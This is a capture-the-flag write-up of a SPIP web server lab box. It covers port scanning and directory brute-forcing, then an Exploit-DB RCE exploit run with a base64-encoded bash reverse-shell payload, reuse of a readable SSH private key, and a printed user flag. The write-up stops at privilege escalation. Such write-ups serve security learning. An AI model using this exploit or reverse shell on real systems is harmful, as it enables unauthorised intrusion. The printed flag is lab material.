I started by doing an nmap scan
```bash
nmap -p- -sC -sV -vv -T4-min-rate=10000 10.10.246.38
```
And the results were
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 90:dd:c8:f1:20:35:33:ea:f0:8d:48:72:9a:52:33:19 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLVXpmydSeynI8zUJ5zi5p54q78nhQR1r/ctNiVcx/WO8Jpz2rIxc9RNS/ENV6nF8IKpnkcmB0+pGtoaAgLJ1rCQFvdY3tV44F1Gh3K5QubpnyxjuzLF8YuG9TesiMIV0gutynIM+wPm1vmvJOhey8oXOqLxqIEazUBy7dzuk8cX1p+LkybF+dNq7KZoT9uLxAMg02MIDX4BQ1Xc5bNyYfKJ5H8xbtYuRdef6Kd4b7vF8UVRl90iX4HVGW07lsPcWqpU4aFI0rnTLD7tUqHFVAsIOUEtJc/qVoHTmCKx7vtZ4qTQgTZQc5RRzpaBSwBoUjSfORDWd/5SP9uQON9LJ4lD/Pb8zl6qB2SNAwmNsB78Hu15Fy6F4/2jzyoI2R06lREb5QAK9YQRCgPULIMGEJVZ6PoLVjelHZhil/7XoUKHR3RhLfg4FX0VHWmJs0gb/pS3+pfzZrDbjc+Mo5rGYqTCCHZpRA4ARoth3EO9BJtcWWA8Xz1qcXlkYEc/OSpoc=
|   256 ae:a3:83:fd:6d:3d:82:a3:bd:e1:f6:35:d1:5c:53:d5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJKlR5zsVR/THut/Nscw/m1ezJ1XNsT1Xt/WUZoQ4wWneE5PdZUeafJ9QQAC240Trz7uiEBAtLCh7Xdz3hK0+hs=
|   256 1d:3f:0a:3d:c4:77:3a:be:05:8d:1c:91:cf:74:5c:a4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOLWnUq16A8RMgReM/Mj7bODW0v35LvJEInrBrL0GXf7
80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publishers Pulse: SPIP Insights & Tips
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We noticed that there is a web page on port 80 and ssh is open on port 22.
Next step is to look around in the web page and use gobuster to search for more information.
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u 10.10.246.38 -t50
```
I found /images and /spip. In the CTF "info" there was talk about having to use an RCE (Remote code execution) so i decided to lookup spip on msfconsole

I searched for SPIP 4.2.0 but didn't find anything so I tried googling.
and i found this https://www.exploit-db.com/exploits/51536

I ran the code and started netcat on another terminal
```bash
python3 51536.py -u http://10.10.246.38/spip -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC42LjI1LjE1OS80NDQ0IDA+JjE= | base64 -d | bash"
```
Now we have gotten a reverse shell.
To save the hassle of searching for the user.txt flag I wrote
```bash
find / -name "user.txt" 2>/dev/null
```
cat /home/think/user.txt
fa229046d44eda6a3598c73ad96f4ca5

Now we have to find a way to escalate our priviledges and get the root.flag.

When browsing around the directories I found an readable .ssh file which included the private key so i was able to log in to get a more stable shell.
I copied the key and chmod 600 and logged in with 
```bash
ssh -i id_rsa think@10.10.246.38
```
Then i decided to transfer the linpeass over to automate the search for possiblevulnerabilities. But that didn't work since I pretty much had no permission to do anything. I pressed the "hint" button and it said to check out the apparmor folder.


